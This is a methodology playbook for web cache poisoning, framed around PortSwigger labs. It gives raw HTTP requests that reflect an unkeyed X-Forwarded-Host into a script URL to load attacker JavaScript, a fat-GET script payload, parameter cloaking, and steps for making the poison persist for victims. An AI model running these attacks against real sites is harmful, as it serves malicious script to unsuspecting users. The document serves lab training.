# Web Cache Poisoning Methodology
## Expert-Level Playbook (unkeyed inputs, cache-key manipulation, chaining)

> 13 PortSwigger labs. Goal: get a harmful response stored in a shared cache so
> it is served to other users. Distinct from web cache *deception* (which
> tricks the cache into storing a victim's private response). Always test with a
> unique cache buster, then remove it for the final persistent poison.

---

## Phase 1: Recon — Is it cacheable, and what is the cache key?

### 1.1 Identify caching
```
http_request url=https://TARGET/  # inspect response headers
```
Look for: `X-Cache: hit|miss`, `Cache-Control`, `Age`, `X-Cache-Hits`,
`CF-Cache-Status`, `Vary`, `Cache-Status`. Repeat the request: a second `hit`
with an increasing `Age` confirms caching.

### 1.2 Cache-buster discipline
Add a unique unkeyed param each attempt so you never poison the real key while
probing: `?cb=reynard123`. Confirm your buster is *unkeyed* (not part of the
key) by verifying two different values still share a cached response.

### 1.3 Find unkeyed inputs (the whole game)
Inputs the cache ignores in its key but the origin reflects/acts on:
- `Host`, `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Forwarded-Proto`
- `X-Forwarded-For`, `X-Host`, `X-Original-URL`, `X-Rewrite-URL`
- Query params excluded from the key, cookies, `Accept-Encoding`, `Origin`
Use Param Miner-style header brute force:
```
ffuf_fuzz  # or burp_send_to_intruder with a header wordlist
burp_get_proxy_history_regex  # confirm what the origin reflects
```

---

## Phase 2: Detection Primitives

### 2.1 Unkeyed header reflection
```
GET /?cb=1 HTTP/1.1
Host: TARGET
X-Forwarded-Host: canary.evil-cache.test
```
If `canary.evil-cache.test` appears in the response body (e.g. in an absolute
resource URL, `<link>`, canonical, or JS import), it's a poisoning primitive.

### 2.2 Confirm it caches
Send the malicious request WITH a cache buster, then request the same
buster WITHOUT the header — if the canary persists, the poison is cached under
that key.

### 2.3 Common reflected sinks → impact
| Unkeyed input reflected into | Impact |
|------------------------------|--------|
| `<script src>` / import URL   | load attacker JS → stored XSS for all users |
| `<link rel=stylesheet>`       | CSS injection / exfil |
| Open redirect `Location`      | mass redirect |
| Absolute URLs from Host       | resource hijack |
| `Vary`-excluded content-type  | serve wrong content |

---

## Phase 3: Exploitation (per sub-variant)

| Sub-variant | Technique |
|-------------|-----------|
| Unkeyed header → XSS | reflect `X-Forwarded-Host` into a script/resource URL, host malicious JS |
| Unkeyed cookie | cookie reflected + cached (rare; needs cookie in reflected content) |
| Multiple headers | chain e.g. `X-Forwarded-Host` + `X-Forwarded-Scheme` to force absolute attacker URL |
| Cache key injection | inject via a keyed header that is parsed loosely (e.g. `:` in Host) |
| Parameter cloaking | exclude a param from the key using `;`/duplicate params so origin sees it but cache doesn't |
| Fat GET | body params on a GET that the origin honors but the cache ignores |
| Normalization discrepancy | cache vs origin differ on path/param normalization |
| Internal cache poisoning | chain with request smuggling to poison the response queue |

### 3.1 Unkeyed header → stored XSS (canonical lab)
```
GET /?cb=poison HTTP/1.1
Host: TARGET
X-Forwarded-Host: exploit-XXXX.exploit-server.net
```
If the origin builds `<script src="//X-Forwarded-Host/resources/js/tracking.js">`,
host a malicious `/resources/js/tracking.js` on the exploit server, poison the
key, then remove the buster so victims hit the poisoned `/`.

### 3.2 Parameter cloaking / exclusion
```
GET /?utm_content=x&callback=setResult;cb=1 HTTP/1.1   # ';' splits differently
GET /?param=value1&param=value2 HTTP/1.1               # duplicate-key handling
```
Force the cache to key on a benign value while the origin acts on the malicious
duplicate.

### 3.3 Fat GET
```
GET /?param=benign HTTP/1.1
Host: TARGET
Content-Length: 19

param=<script>...</script>
```
Origin honors the body param, cache keys only the URL.

### 3.4 Chained with request smuggling
Use `request_smuggling_probe` / raw send to smuggle a request whose response is
cached against a victim key (see request_smuggling.md §3.4).

---

## Phase 4: Tooling

```
http_request              # header/param probing + reflection checks
capture_baseline / diff_against_baseline   # confirm cached vs fresh delta
ffuf_fuzz / burp_send_to_intruder          # header + param name brute force
burp_get_proxy_history_regex               # find where inputs reflect
# Host malicious resource for header→XSS chains:
# exploit_server.store(head, body, path="/resources/js/tracking.js")
```

---

## Common Failure Modes & Solutions

| Problem | Solution |
|---------|----------|
| Poison won't stick | You cached under a buster key; remove buster for final poison |
| Header not reflected | Brute-force more header names (Param Miner wordlist) |
| Response not cached | Find a cacheable path (static ext, GET, `Cache-Control: public`) |
| `Vary` splits cache | Match the `Vary` header values (e.g. `User-Agent`, `Accept-Encoding`) |
| Reflection HTML-encoded | Look for URL/attribute/script-src contexts that don't encode |
| TTL too short to observe | Re-poison immediately before the victim request |

## Validation / Success Criteria
- [ ] Malicious value appears in a *cached* response (second request, no header).
- [ ] A different cache key (control) stays clean.
- [ ] The poison produces real impact (XSS executes, redirect fires) for a
      victim-equivalent request.
- [ ] Lab solved banner observed.
